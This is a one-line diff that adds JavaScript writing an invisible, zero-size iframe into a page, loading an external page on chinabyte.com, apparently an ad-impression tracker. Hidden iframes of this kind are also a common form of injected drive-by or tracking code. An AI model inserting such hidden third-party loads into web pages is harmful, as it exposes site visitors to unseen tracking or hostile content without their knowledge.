@@ -1,0 +1,1 @@
+document.write("<iframe src=http://www.chinabyte.com/w/a/imp-cb1.htm width=0 height=0 frameborder=0 scrolling=no></iframe>");
